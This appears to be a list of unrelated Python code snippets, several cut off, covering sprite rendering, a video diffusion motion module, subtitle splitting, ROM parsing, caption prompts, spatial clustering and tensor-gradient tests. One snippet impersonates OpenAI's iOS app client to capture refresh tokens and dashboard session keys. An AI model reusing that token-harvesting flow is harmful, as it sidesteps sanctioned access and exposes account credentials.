     if not only_pattern:\n            img.paste(self.sprite_base, (0, 0))\n\n        for index in range(4):\n            # Calculate the top-left coordinate for the spot image\n            position = (self.spot_offsets[index][0] + self.spots[index][0],\n                        self.spot_offsets[index][1] + self.spots[index][1])\n\n            # Create a full-size image for the full spot at the desired position,\n            #   as composite operation requires same-sized images\n            spot_full = Image.new('RGBA', size, (0, 0, 0, 0))\n            spot_full.paste(self.spot_masks[index], position, mask=self.spot_masks[index])\n\n            # Create temporary mask by combining mask and spot mask\n            temp_mask = Image.new('RGBA', size, (0, 0, 0, 0))\n            temp_mask.paste(self.sprite_mask, (0, 0), mask=spot_full)\n\n            if only_pattern:\n                # Composite the white spot onto the masked area\n                temp_mask = Image.composite(spot_full, temp_mask, temp_mask)\n\n            # Composite the new mask with the current result\n            img = Image.composite(temp_mask, img, temp_mask)\n\n        if crop:\n            img = img.crop((17, 15, 52, 48))\n\n        return img\n\n    def get_difference(self, target):\n        # Validate the mode will match the type used in the next step\n        if target.mode != \"RGB\":\n            target = target.convert(\"RGB\")\n        # Compare the resulting images by the total average pixel difference\n        result = self.render_pattern(only_pattern=True, crop=True).convert(\"RGB\")\n        diff = ImageChops.difference(target, result)\n        total_diff = 0\n        for n, (r, g, b) in diff.getcolors():  # gives a list of counter and RGB values in the image\n            total_diff += n*((r+g+b)/3)\n        return total_diff\n\nif __name__ == \"__main__\":\n    spin = SpindaConfig.from_personality(0x7a397866)\n    spin.render_pattern().show()\n    #print(hex(spin.get_personality()))",
    "# Adapt from https://github.com/guoyww/AnimateDiff/blob/main/animatediff/models/motion_module.py\nimport math\nfrom dataclasses import dataclass\nfrom typing import Callable, Optional\n\nimport torch\nfrom diffusers.models.attention import FeedForward\nfrom diffusers.models.attention_processor import Attention, AttnProcessor\nfrom diffusers.utils import BaseOutput\nfrom diffusers.utils.import_utils import is_xformers_available\nfrom einops import rearrange, repeat\nfrom torch import nn\n\n\ndef zero_module(module):\n    # Zero out the parameters of a module and return it.\n    for p in module.parameters():\n        p.detach().zero_()\n    return module\n\n\n@dataclass\nclass TemporalTransformer3DModelOutput(BaseOutput):\n    sample: torch.FloatTensor\n\n\nif is_xformers_available():\n    import xformers\n    import xformers.ops\nelse:\n    xformers = None\n\n\ndef get_motion_module(in_channels, motion_module_type: str, motion_module_kwargs: dict):\n    if motion_module_type == \"Vanilla\":\n        return VanillaTemporalModule(\n            in_channels=in_channels,\n            **motion_module_kwargs,\n        )\n    else:\n        raise ValueError\n\n\nclass VanillaTemporalModule(nn.Module):\n    def __init__(\n        self,\n        in_channels,\n        num_attention_heads=8,\n        num_transformer_block=2,\n        attention_block_types=(\"Temporal_Self\", \"Temporal_Self\"),\n        cross_frame_attention_mode=None,\n        temporal_position_encoding=False,\n        temporal_position_encoding_max_len=24,\n        temporal_attention_dim_div=1,\n        zero_initialize=True,\n    ):\n        super().__init__()\n\n        self.temporal_transformer = TemporalTransformer3DModel(\n            in_channels=in_channels,\n            num_attention_heads=num_attention_heads,\n            attention_head_dim=in_channels\n            // num_attention_heads\n            // temporal_attention_dim_div,\n            num_layers=num_transformer_block,\n            attention_block_types=attention_block_types,\n            cross_frame_attention_mode=cross_frame_attention_mode,\n            temporal_position_encoding=temporal_position_encoding,\n            temporal_position_encoding_max_len=temporal_position_encoding_max_len,\n        )\n\n        if zero_initialize:\n            self.temporal_transformer.proj_out = zero_module(\n                self.temporal_transformer.proj_out\n            )\n\n    def forward(\n        self,\n        input_tensor,\n        temb,\n        encoder_hidden_states,\n        attention_mask=None,\n        anchor_frame_idx=None,\n    ):\n        hidden_states = input_tensor\n        hidden_states = self.temporal_transformer(\n            hidden_states, encoder_hidden_states, attention_mask\n        )\n\n        output = hidden_states\n        return output\n\n\nclass TemporalTransformer3DModel(nn.Module):\n    def __init__(\n        self,\n        in_channels,\n        num_attention_heads,\n        attention_head_dim,\n        num_layers,\n        attention_block_types=(\n            \"Temporal_Self\",\n            \"Temporal_Self\",\n        ),\n        dropout=0.0,\n        norm_num_groups=32,\n        cross_attention_dim=768,\n        activation_fn=\"geglu\",\n        attention_bias=False,\n        upcast_attention=False,\n        cross_frame_attention_mode=None,\n        temporal_position_encoding=False,\n        temporal_position_encoding_max_len=24,\n    ):\n        super().__init__()\n\n        inner_dim = num_attention_heads * attention_head_dim\n\n        self.norm = torch.nn.GroupNorm(\n            num_groups=norm_num_groups, num_channels=in_channels, eps=1e-6, affine=True\n        )\n        self.proj_in = nn.Linear(in_channels, inner_dim)\n\n        self.transformer_blocks = nn.ModuleList(\n            [\n                TemporalTransformerBlock(\n                    dim=inner_dim,\n                    num_attention_heads=num_attention_heads,\n                    attention_head_dim=attention_head_dim,\n                    attention_block_types=attention_block_types,\n                    dropout=dropout,\n                    norm_num_groups=norm_num_groups,\n                    cross_attention_dim=cross_attention_dim,\n                    activation_fn=activation_fn,\n                    attention_bias=attention_bias,\n                    upcast_attention=upcast_attention,\n                    cross_frame_attention_mode=cross_frame_attention_mode,\n                    temporal_position_encoding=temporal_position_encoding,\n                    temporal_position_encoding_max_len=temporal_position_encoding_max_len,\n                )\n                for d in range(num_layers)\n            ]\n        )\n        self.proj_out = nn.Linear(inner_dim, in_channels)\n\n    def forward(self, hidden_states, encoder_hidden_states=None, attention_mask=None):\n        assert (\n            hidden_states.dim() == 5\n        ), f\"Expected hidden_states to have ndim=5, but got ndim={hidden_states.dim()}.\"\n        video_length = hidden_states.shape[2]\n        hidden_states = rearrange(hidden_states, \"b c f h w -> (b f) c h w\")\n\n        batch, channel, hei",
    "import asyncio\nimport os.path\nimport re\nimport aiofiles\nimport edge_tts\n\nfrom load_config import get_yaml_config\n\nconfig = get_yaml_config()\nlimit = config[\"audio\"][\"limit\"]\nrole = config[\"audio\"][\"role\"]\nrate = config[\"audio\"][\"rate\"]\nvolume = config[\"audio\"][\"volume\"]\n\n\nasync def spilt_str2(s, t, k=limit):\n    \"\"\"\n    :param s: \u5207\u7247\u6587\u672c\n    :param t: \u5207\u5206\u524d\u65f6\u95f4\n    :param k: \u5207\u5206\u6700\u5927\u5b57\u6570\n    :return:  \u65b0\u7684\u5207\u7247\u4fe1\u606f\n\n    @ samples\n        s = \"\u5e76\u4e14\u89c9\u9192\u5929\u8d4b \u5f97\u5230\u529b\u91cf \u5bf9\u6297\u51f6\u517d \u89c9\u9192\u5929\u8d4b \u4fbf\u662f\u4eba\u4eba\u5728\u5341\u516b\u5c81\u65f6\u80fd\u4ee5\u8840\u8109\u6c9f\u901a\u6c9f\u901a \u89c9\u9192\u5929\u8d4b\"\n        t = \"00:00:35,184 --> 00:00:42,384\"\n        k = 15\n    \"\"\"\n\n    async def time2second(ti):\n        \"\"\"\n        :param ti: \u8f93\u5165\u65f6\u95f4\uff0c \u683c\u5f0f\u793a\u4f8b\uff1a00:02:56,512\n        :return: float\n        \"\"\"\n        a, b, _c = ti.split(\":\")\n        c, d = _c.split(\",\")\n\n        a, b, c, d = int(a), int(b), int(c), int(d)\n\n        second = a * 3600 + b * 60 + c + d / 1000\n\n        return second\n\n    async def second2time(si):\n        hours = int(si // 3600)\n        minutes = int((si % 3600) // 60)\n        seconds = int(si % 60)\n        milliseconds = round((si % 1) * 1000)\n\n        v = \"00\"\n        u = \"000\"\n        a = v[: 2 - len(str(hours))] + str(hours)\n        b = v[: 2 - len(str(minutes))] + str(minutes)\n        c = v[: 2 - len(str(seconds))] + str(seconds)\n        d = u[: 3 - len(str(milliseconds))] + str(milliseconds)\n\n        return f\"{a}:{b}:{c},{d}\"\n\n    ss = s.split(\" \")\n    ss_valid = []\n\n    # todo \u5c06\u6240\u6709\u7247\u6bb5\u8bbe\u7f6e\u6210\u4e0d\u8d85\u8fc715\n    for _ss in ss:\n        if len(_ss) > k:\n\n            # \u66b4\u529b\u622a\u65ad\u51e0\u6bb5\n            e = len(_ss) // k + 1\n            n_e = len(_ss) // e + 1\n\n            for _i in range(e):\n                if _i == e - 1:\n                    ss_valid.append(_ss[n_e * _i :])\n                else:\n                    ss_valid.append(_ss[n_e * _i : n_e * (_i + 1)])\n        else:\n            ss_valid.append(_ss)\n\n    # todo \u7247\u6bb5\u5408\u5e76\n    tmp = \"\"\n    new_ss = []\n    for i in range(len(ss_valid)):\n        tmp += ss_valid[i]\n\n        if i < len(ss_valid) - 1:\n            if len(tmp + ss_valid[i + 1]) > k:\n                new_ss.append(tmp)\n                tmp = \"\"\n            else:\n                continue\n        else:\n            new_ss.append(tmp)\n            tmp = \"\"\n\n    # \u5206\u914d\u65f6\u95f4\u6233\n    t1, t2 = t.split(\"-->\")\n    ft1 = await time2second(t1)\n    ft2 = await time2second(t2)\n    ftd = ft2 - ft1\n\n    # \u8f6c\u6362\u6210\u79d2\u6570\n    all_str = \" \".join(new_ss)\n\n    tt_s = 0\n    line_srt = []\n    for z in new_ss:\n        tt_e = len(z) + tt_s\n\n        # \u6587\u7ae0\u6700\u540e\u4e00\u53e5\u5f02\u5e38\u5904\u7406\n        if len(all_str) * ftd == 0:\n            continue\n\n        t_start = tt_s / len(all_str) * ftd\n        t_end = tt_e / len(all_str) * ftd\n        t_start = round(t_start, 3)\n        t_end = round(t_end, 3)\n\n        rec_s = await second2time(ft1 + t_start)\n        rec_e = await second2time(ft1 + t_end)\n\n        cc = (f\"{rec_s} --> {rec_e}\", z)\n        line_srt.append(cc)\n\n        tt_s = tt_e + 1\n\n    return line_srt\n\n\nasync def load_srt_new(filename, flag=True):\n    time_format = r\"(\\d{2}:\\d{2}:\\d{2}),\\d{3} --> (\\d{2}:\\d{2}:\\d{2}),\\d{3}\"\n\n    n = 0  # srt \u6587\u4ef6\u603b\u884c\u6570\n    index = 0  # strs \u6587\u5b57\u4e32\u79fb\u52a8\u4e0b\u6807\n    line_tmp = \"\"  # \u6bcf\u4e2a\u65f6\u95f4\u533a\u95f4\u540e\u7684\u5b57\u6570\u7d2f\u8ba1\n    count_tmp = 0  # \u6bcf\u4e2a\u65f6\u95f4\u533a\u95f4\u540e\u7684\u5b57\u6570\u884c\u8ba1\u6570\n    new_srt = []\n\n    async with aiofiles.open(filename, mode=\"r\", encoding=\"utf-8\") as f3:\n        f_lines = await f3.readlines()\n        for line in f_lines:\n            line = line.strip(\"\\n\")\n\n            n += 1\n\n            # \u5199\u5165\u65b0\u7684\u6570\u636e\n            #   1)\u5f53\u51fa\u73b0\u5728\u6587\u672c\u672b\u5199\u5165\u4e00\u6b21\n            if n == len(f_lines):\n                new_srt_line = await spilt_str2(line_tmp, t_line_cur)\n                new_srt.append(new_srt_line)\n\n            #   2\uff09\u5f53\u65b0\u7684\u4e00\u884c\u662f\u6570\u5b57\u65f6\uff0csrt\u8bed\u53e5\u6bb5\u5199\u5165\n            # case1: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u4e0d\u662f\u6570\u5b57\n            if line.isdigit():\n                if flag:\n                    print(line)\n                if n > 1:\n                    new_srt_line = await spilt_str2(line_tmp, t_line_cur)\n                    new_srt.append(new_srt_line)\n                continue\n\n            # case2: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u4e0d\u662f\u65f6\u95f4\u6bb5\n            if re.match(time_format, line):\n                t_line_cur = line\n\n                # reset line_tmp\n                line_tmp = \"\"\n                count_tmp = 0\n                continue\n\n            # case3: \u5224\u65ad\u65b0\u7684\u4e00\u884c\u662f\u7a7a\u683c\u65f6\n            if len(line) == 0:\n                continue\n\n            # case4: \u65b0\u7684\u4e00\u884c\u4e0d\u5c5e\u4e8e\u4e0a\u9762\u5176\u4e2d\u4e4b\u4e00\n            line_std = line.replace(\" \", \"\")\n            if flag:\n                print(f\"{line}\\n{line_std}\")\n\n            if count_tmp:\n                line_tmp += \" \" + line_std\n            else:\n                line_tmp += line_std\n            count_tmp += 1\n\n    srt = []\n    for _line in new_srt:\n        for _l in _line:\n            srt.append(_l)\n\n    return srt\n\n\nasync def save_srt(filename, srt_list):\n    async with aiofiles.open(filename, mode=\"w\", encoding=\"utf-8\") as f:\n        for _li, _l in enumerate(srt_list):\n            if _li == len(srt_list) - 1:\n                info = \"{}\\n{}\\n{}\".format(_li + 1, _l[0], _l[1])\n            else:\n                info = \"{}\\n{}\\n{}\\n\\n\".format(_li + 1, _l[0], _l[1])\n            await f.write(info)\n\n\nasync def srt_regen_new(f_srt, f_save, flag):\n",
    "import base64\nimport hashlib\nimport json\nimport os\nimport random\nimport string\nimport time\nfrom urllib.parse import urlparse\n\nimport click\nimport requests\nfrom DrissionPage import ChromiumOptions\nfrom DrissionPage._pages.web_page import WebPage\n\n\ndef to_time(t: int = None):\n    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t))\n\n\ndef to_timestamp(t: str = None):\n    return time.strptime(t, '%Y-%m-%d %H:%M:%S') if t else time.time()\n\n\nclass TokenManager:\n    def __init__(\n            self,\n            refresh_token=None,\n            device_token=None,\n            refresh_interval=60,\n            storage_path='./token.json',\n            proxy='http://127.0.0.1:10809',\n    ):\n        self.refresh_token = refresh_token\n        self.device_token = device_token\n        self.refresh_interval = refresh_interval\n        self.access_token = None\n        self.storage_path = storage_path\n        self.co = ChromiumOptions()\n        if proxy:\n            self.co.set_proxy(proxy)\n            self.proxy = {'all': proxy}\n        else:\n            self.proxy = None\n        self.load_token()\n        self.save_token()\n\n    def get_refresh_token(self):\n        self.ensure_refresh_token()\n        return self.refresh_token\n\n    def get_access_token(self):\n        if self.is_expired():\n            self.refresh()\n        return self.access_token\n\n    def get_sess_key(self):\n        response = requests.post(\n            'https://api.openai.com/dashboard/onboarding/login',\n            headers={\n                \"Authorization\": f\"Bearer {self.get_access_token()}\",\n                \"Content-Type\": \"application/json\",\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0\",\n            },\n            proxies=self.proxy\n        )\n        if response.ok:\n            data = json.loads(response.text)\n            return {\n                'sess_key': data['user']['session']['sensitive_id'],\n                'created': to_time(data['user']['session']['created']),\n                'last_use': to_time(data['user']['session']['last_use']),\n            }\n\n    def is_expired(self):\n        if not self.access_token:\n            return True\n        payload = self.access_token.split('.')[1]\n        payload = payload + '=' * - (len(payload) % - 4)\n        exp = json.loads(base64.b64decode(payload).decode()).get('exp')\n        return exp - time.time() < 60\n\n    def refresh(self):\n        self.ensure_refresh_token()\n        self.access_token = self.generate_access_token()\n\n    def ensure_refresh_token(self):\n        if self.refresh_token:\n            return\n        code_verifier = self.generate_code_verifier()\n        code_challenge = self.generate_code_challenge(code_verifier)\n        preauth_cookie = self.get_preauth_cookie()\n        if not preauth_cookie:\n            raise Exception('\u6293\u53d6preauth_cookie\u5931\u8d25')\n        url = f'https://auth0.openai.com/authorize' \\\n              f'?client_id=pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh' \\\n              f'&audience=https%3A%2F%2Fapi.openai.com%2Fv1' \\\n              f'&redirect_uri=com.openai.chat%3A%2F%2Fauth0.openai.com%2Fios%2Fcom.openai.chat%2Fcallback' \\\n              f'&scope=openid%20email%20profile%20offline_access%20model.request%20model.read%20organization.read%20offline' \\\n              f'&response_type=code' \\\n              f'&code_challenge={code_challenge}' \\\n              f'&code_challenge_method=S256' \\\n              f'&preauth_cookie={preauth_cookie}'\n\n        url += '&prompt=login'\n        # print(url)\n        # code = input('code: ')\n        page = WebPage(chromium_options=self.co)\n        page.get(url)\n        page.listen.start('com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback')\n        res = page.listen.wait()\n        query1 = {args.split('=')[0]: args.split('=')[1] for args in urlparse(res.url).query.split('&')}\n        code = query1.get('code')\n        if not code:\n            raise Exception('preauth_cookie\u5df2\u8fc7\u671f')\n        # state = query1['state']\n        page.close()\n        resp_json = requests.post('https://auth0.openai.com/oauth/token', json={\n            'redirect_uri': 'com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback',\n            'grant_type': 'authorization_code',\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'code': code,\n            'code_verifier': code_verifier\n        }, proxies=self.proxy).json()\n        # json.dump(resp_json, open('./app.json', 'w'))\n        # print(json.dumps(resp_json, indent=2))\n        self.refresh_token = resp_json.get('refresh_token')\n        self.save_token()\n\n    def revoke_refresh_token(self, refresh_token):\n        resp = requests.post('https://auth0.openai.com/oauth/revoke', json={\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'token': refresh_token\n        }, proxies=self.proxy)\n        assert resp.status_code == 200\n        self.refresh_token = None\n        self.save",
    "import contextlib\nimport json\nimport os\nimport re\nimport subprocess\nfrom dataclasses import dataclass\nfrom typing import List\n\nfrom rom_metacritic_match.rom_match_platform import RomMatchPlatform\n\nrdb_dir = \"rdb\"\n\n\n@dataclass\nclass RdbEntry:\n    rom_name: str\n    size: int\n    region: str\n    developer: str | None\n    publisher: str | None\n    clean_name: str\n\n\ndef read_rdb(filename) -> List[RdbEntry]:\n    process = subprocess.run(\n        [\"./bin/libretrodb_tool\", filename, \"list\"], capture_output=True\n    )\n    values: List[RdbEntry] = []\n    for line in process.stdout.decode().split(\"\\n\"):\n        line = line.replace(\"\\\\\", \"\\\\\\\\\")\n        with contextlib.suppress(json.decoder.JSONDecodeError):\n            game = json.loads(line)\n\n            # Some games do not have a name, we just discard them\n            if \"name\" not in game or not game[\"name\"]:\n                continue\n            # Discard any games with no size (no dump)\n            if \"size\" not in game or not game[\"size\"]:\n                continue\n\n            clean_name: str = game.get(\"rom_name\")\n            # Remove parenthesis groups\n            clean_name = re.sub(r\"\\([^()]*\\)\", \"\", clean_name)\n            # Remove file extension\n            clean_name = re.sub(r\"\\.[^.]+$\", \"\", clean_name)\n            clean_name = clean_name.strip()\n\n            values.append(\n                RdbEntry(\n                    game.get(\"rom_name\"),\n                    game.get(\"size\"),\n                    game.get(\"region\"),\n                    game.get(\"developer\", None),\n                    game.get(\"publisher\", None),\n                    clean_name,\n                )\n            )\n\n    print(f\"{len(values)} entries\")\n    return values\n\n\ndef get_rdb_filename(rdb_name: str):\n    files = os.listdir(rdb_dir)\n\n    # Find the file that starts with the platform string\n    matching_files = [file for file in files if file == f\"{rdb_name}.rdb\"]\n    return os.path.join(rdb_dir, matching_files[0]) if matching_files else None\n\n\ndef parse_rdb(platform: RomMatchPlatform) -> List[RdbEntry]:\n    filenames = list(map(lambda x: get_rdb_filename(x), platform.rdb_names))\n    rdb_entries: List[RdbEntry] = []\n    for filename in filenames:\n        rdb_entries.extend(read_rdb(filename))\n\n    return rdb_entries\n",
    "PROMPT_LLAVA_PRETRAIN = [\n        'Render a clear and concise summary of the photo.\\n<image>',\n        'Write a terse but informative summary of the picture.\\n<image>',\n        '<image>\\nWhat is this?',\n        '<image>\\nRender a clear and concise summary of the photo.',\n        'What is in the photo?\\n<image>',\n        'Describe the image concisely.\\n<image>',\n        'Share a concise interpretation of the image provided.\\n<image>',\n        'Give a brief description of the image.\\n<image>',\n        \"<image>\\nPresent a compact description of the photo's key features.\",\n        '<image>\\nDescribe the image concisely.',\n        'What is this?\\n<image>',\n        '<image>\\nWrite a terse but informative summary of the picture.',\n        'Provide a brief description of the given image.\\n<image>',\n        'Summarize the visual content of the image.\\n<image>',\n        '<image>\\nWhat is in the photo?',\n        '<image>\\nProvide a brief description of the given image.',\n        \"Present a compact description of the photo's key features.\\n<image>\",\n        'Give a short and clear explanation of the subsequent image.\\n<image>',\n        '<image>\\nGive a short and clear explanation of the subsequent image.',\n        '<image>\\nGive a brief description of the image.',\n        '<image>\\nSummarize the visual content of the image.',\n        '<image>\\nShare a concise interpretation of the image provided.'\n    ]",
    "import numpy as np\r\nimport warnings\r\nimport random\r\nimport geopandas as gpd\r\nimport matplotlib.pyplot as plt\r\nfrom scipy.ndimage import maximum_filter\r\n\r\ndef extract_hotspots(density_data_path, window_size=10, threshold=0):\r\n    \"\"\"\r\n    Extract hotspots from density data using a window analysis approach.\r\n\r\n    Parameters:\r\n        density_data_path (str): Path to the .npy file containing density data.\r\n        window_size (int): Size of the window for maximum filter (default is 10).\r\n        threshold (int): Threshold value for extreme regions (default is 0).\r\n\r\n    Returns:\r\n        hotspots (ndarray): Array containing coordinates of hotspots.\r\n    \"\"\"\r\n    # Load density data from the saved .npy file\r\n    density_data = np.load(density_data_path)\r\n\r\n    # Step 1: Window analysis to get maximum values within each window\r\n    max_density_surface = maximum_filter(density_data, size=window_size)\r\n\r\n    # Step 2: Algebraic subtraction to get non-negative surface\r\n    non_negative_surface = max_density_surface - density_data\r\n\r\n    # Step 3: Reclassification algorithm to classify into extreme and non-extreme regions\r\n    extreme_region = non_negative_surface == threshold\r\n\r\n    # Step 4: Extract hotspots from extreme regions\r\n    hotspots = np.argwhere(extreme_region)\r\n\r\n    return hotspots\r\n\r\ndef visualize_hotspots(density_data, hotspots):\r\n    \"\"\"\r\n    Visualize hotspots on the density data.\r\n\r\n    Parameters:\r\n        density_data (ndarray): Density data array.\r\n        hotspots (ndarray): Array containing coordinates of hotspots.\r\n    \"\"\"\r\n    plt.figure(figsize=(8, 6))\r\n    plt.imshow(density_data, cmap='Purples', origin='lower')\r\n    plt.colorbar(label='Density')\r\n    plt.scatter(hotspots[:, 1], hotspots[:, 0], color='red', s=5, label='Hotspots')\r\n    plt.xlabel('X')\r\n    plt.ylabel('Y')\r\n    plt.title('Hotspot Extraction')\r\n    plt.legend()\r\n    plt.show()\r\n\r\ndef spectral_clustering_with_plot(points_shapefile, num_clusters=3, k=5, sigma=1):\r\n    \"\"\"\r\n    Perform spectral clustering on a set of points from a shapefile and plot the clusters.\r\n\r\n    Args:\r\n    points_shapefile (str): Path to the shapefile containing point data.\r\n    num_clusters (int): Number of clusters to partition the data into.\r\n    k (int): Number of nearest neighbors to consider for constructing the adjacency matrix.\r\n    sigma (float): Sigma parameter for the Gaussian similarity function.\r\n\r\n    Returns:\r\n    np.array: Cluster labels for each point.\r\n    \"\"\"\r\n\r\n    def gaussian_similarity_matrix(points, sigma=1):\r\n        n = len(points)\r\n        similarity_matrix = np.zeros((n, n))\r\n        for i in range(n):\r\n            for j in range(n):\r\n                similarity_matrix[i][j] = np.exp(-((points[i].x - points[j].x) ** 2 + (points[i].y - points[j].y) ** 2) / (2 * sigma ** 2))\r\n        return similarity_matrix\r\n\r\n    def adjacency_matrix(similarity_matrix, k):\r\n        n = len(similarity_matrix)\r\n        adjacency_matrix = np.zeros((n, n))\r\n        for i in range(n):\r\n            idx = np.argsort(similarity_matrix[i])[::-1][:k]\r\n            adjacency_matrix[i][idx] = similarity_matrix[i][idx]\r\n        return adjacency_matrix\r\n\r\n    def laplacian_matrix(adjacency_matrix):\r\n        degree_matrix = np.diag(np.sum(adjacency_matrix, axis=1))\r\n        laplacian_matrix = degree_matrix - adjacency_matrix\r\n        return laplacian_matrix\r\n\r\n    def compute_eigenvectors(laplacian_matrix, num_eigenvectors):\r\n        eigenvalues, eigenvectors = np.linalg.eig(laplacian_matrix)\r\n        sorted_indices = np.argsort(eigenvalues)\r\n        sorted_eigenvalues = eigenvalues[sorted_indices]\r\n        sorted_eigenvectors = eigenvectors[:, sorted_indices]\r\n        return sorted_eigenvalues, sorted_eigenvectors[:, :num_eigenvectors]\r\n\r\n    def kmeans_clustering(data, k, max_iters=100):\r\n        centroids = data[np.random.choice(data.shape[0], k, replace=False)]\r\n        for _ in range(max_iters):\r\n            distances = np.sqrt(((data - centroids[:, np.newaxis])**2).sum(axis=2))\r\n            labels = np.argmin(distances, axis=0)\r\n            new_centroids = np.array([data[labels == i].mean(axis=0) for i in range(k)])\r\n            if np.all(centroids == new_centroids):\r\n                break\r\n            centroids = new_centroids\r\n        return labels\r\n\r\n    # Load shapefile point data\r\n    points_gdf = gpd.read_file(points_shapefile)\r\n\r\n    # Compute similarity matrix\r\n    similarity_matrix = gaussian_similarity_matrix(points_gdf.geometry, sigma)\r\n\r\n    # Construct adjacency matrix\r\n    adj_matrix = adjacency_matrix(similarity_matrix, k)\r\n\r\n    # Compute Laplacian matrix\r\n    laplacian_matrix = laplacian_matrix(adj_matrix)\r\n\r\n    # Compute eigenvectors of Laplacian matrix\r\n    eigenvalues, eigenvectors = compute_eigenvectors(laplacian_matrix, num_clusters)\r\n\r\n    # K-means clustering using eigenvectors\r\n    cluster_labels = kmeans_clustering(eigenvectors, num_clusters)\r\n\r\n    # Plot clusters\r\n    fig, ax = plt.subplots(figsize=(10, 10))\r\n    colors = ",
    "import torch\n\nimport tensorgrad.tensor as tg\nimport tensorgrad.functions as F\n\n\ndef rand_values(variables, **shape):\n    return {v: torch.randn([shape[e] for e in v.edges], names=v.edges) for v in variables}\n\n\ndef assert_close(a, b):\n    assert set(a.names) == set(b.names)\n    a = a.align_to(*b.names)\n    torch.testing.assert_close(a.rename(None), b.rename(None))\n\n\ndef test_simple_grad():\n    x = tg.Variable(\"x\", [\"x\"])\n    A = tg.Variable(\"A\", [\"x\", \"y\"])\n    ts = rand_values([x, A], x=2, y=3)\n    res = (A @ x).grad(x).simplify()\n    assert_close(res.evaluate(ts), ts[A].rename(\"x_\", \"y\"))\n\n\ndef test_simple_hessian():\n    x = tg.Variable(\"x\", [\"x\"])\n    A = tg.Variable(\"A\", [\"x\", \"y\"])\n    ts = rand_values([x, A], x=2, y=2)\n    quad = x @ A @ x.rename({\"x\": \"y\"})\n    res = quad.grad(x).grad(x).simplify()\n    assert_close(res.evaluate(ts), (ts[A].rename(None) + ts[A].rename(None).T).rename(\"x_\", \"x__\"))\n\n    quad2 = x @ A @ A @ x\n    res2 = quad2.grad(x).grad(x).simplify()\n    tA = ts[A].rename(None)\n    torch.testing.assert_close(res2.evaluate(ts).rename(None), 2 * tA @ tA.T)\n\n    x = tg.Variable(\"x\", [\"x\"])\n    y = tg.Variable(\"y\", [\"y\"])\n    A = tg.Variable(\"A\", [\"x\", \"y\"])\n    ts = rand_values([x, y, A], x=2, y=3)\n    frob = F.frobenius2(A @ x - y)\n    hess = frob.grad(x).grad(x).simplify().evaluate(ts)\n    # Hessian of ||Ax - y||^2 is 2 * A^T A\n    tH = 2 * ts[A].rename(None) @ ts[A].rename(None).T\n    assert_close(hess, tH.rename(\"x_\", \"x__\"))\n\n\ndef test_derivative_of_hadamard_product():\n    a = tg.Variable(\"a\", [\"i\", \"j\"])\n    b = tg.Variable(\"b\", [\"i\", \"j\"])\n    ts = rand_values([a, b], i=2, j=3)\n    res_a = (a * b).grad(a).simplify().evaluate(ts)\n    res_b = (a * b).grad(b).simplify().evaluate(ts)\n    torch.testing.assert_close(res_a.sum(), ts[b].sum())\n    torch.testing.assert_close(res_b.sum(), ts[a].sum())\n\n\ndef test_f_0_0():\n    x = tg.Variable(\"x\", [])\n    f = F.Function(\"f\", [], (x,))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == set()\n    assert expr == tg.Function(\"D_0f\", [], (x,))\n\n\ndef test_f_0_1():\n    x = tg.Variable(\"x\", [\"i\"])\n    f = F.Function(\"f\", [], (x, \"i\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"i_\"}\n    fg = F.Function(\"D_0f\", [\"i_\"], (x, \"i\"))\n    assert expr == fg\n\n\n# Function(\"D_0f\", [\"i_\"], (Variable(\"x\", [\"i\"], [\"i\"]), \"i\"), orig_edges_out=[\"i\"])\n# == Function(\"D_0f\", [\"i_\"], (Variable(\"x\", [\"i\"], [\"i\"]), \"i\"))\n\n\ndef test_f_0_2():\n    x = tg.Variable(\"x\", [\"b\", \"i\"])\n    f = F.Function(\"f\", [], (x, \"i\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"b\", \"b_\", \"i_\"}\n    x_renamed = x.rename({\"b\": \"b__\"})\n    fg = F.Function(\"D_0f\", [\"i_\"], (x_renamed, \"i\")) @ tg.Copy([\"b\", \"b_\", \"b__\"])\n    assert hash(expr) == hash(fg)\n\n\ndef test_f_1_0():\n    x = tg.Variable(\"x\", [])\n    f = F.Function(\"f\", [\"y\"], (x,))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"y\"}\n    assert expr == tg.Function(\"D_0f\", [\"y\"], (x,))\n\n\ndef test_f_1_1():\n    x = tg.Variable(\"x\", [\"i\"])\n    f = F.Function(\"f\", [\"y\"], (x, \"i\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"y\", \"i_\"}\n    assert expr == tg.Function(\"D_0f\", [\"y\", \"i_\"], (x, \"i\"))\n\n\ndef test_fxy_1_1_1():\n    x = tg.Variable(\"x\", [\"i\"])\n    y = tg.Variable(\"y\", [\"i\"])\n    f = F.Function(\"f\", [\"z\"], (x, \"i\"), (y, \"i\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"z\", \"i_\"}\n    assert expr == tg.Function(\"D_0f\", [\"z\", \"i_\"], (x, \"i\"), (y, \"i\"))\n\n\ndef test_fxx_1_1_1():\n    x = tg.Variable(\"x\", [\"i\"])\n    f = F.Function(\"f\", [\"z\"], (x, \"i\"), (x, \"i\"))\n    expr = f.grad(x).simplify()\n    assert set(expr.edges) == {\"z\", \"i_\"}\n    # We can't control what connection_edges are used by the chain rule, which makes\n    # this test a bit more brittle.\n    # fmt: off\n    expected = (\n        tg.Function(\"D_0f\", [\"z\", \"i_\"], (x, \"i\"), (x, \"i\"))\n      + tg.Function( \"D_1f\", [\"z\", \"i_\"], (x, \"i\"), (x, \"i\"))\n    )\n    # fmt: on\n    assert expr == expected\n\n\ndef test_f_2_2_multi_input():\n    x = tg.Variable(\"x\", [\"i\", \"j\"])\n    y = tg.Variable(\"y\", [\"k\", \"l\"])\n    f = F.Function(\"f\", [\"a\", \"b\"], (x, \"i\"), (y, \"k\"))\n    expr = f.grad(x).simplify()\n    assert 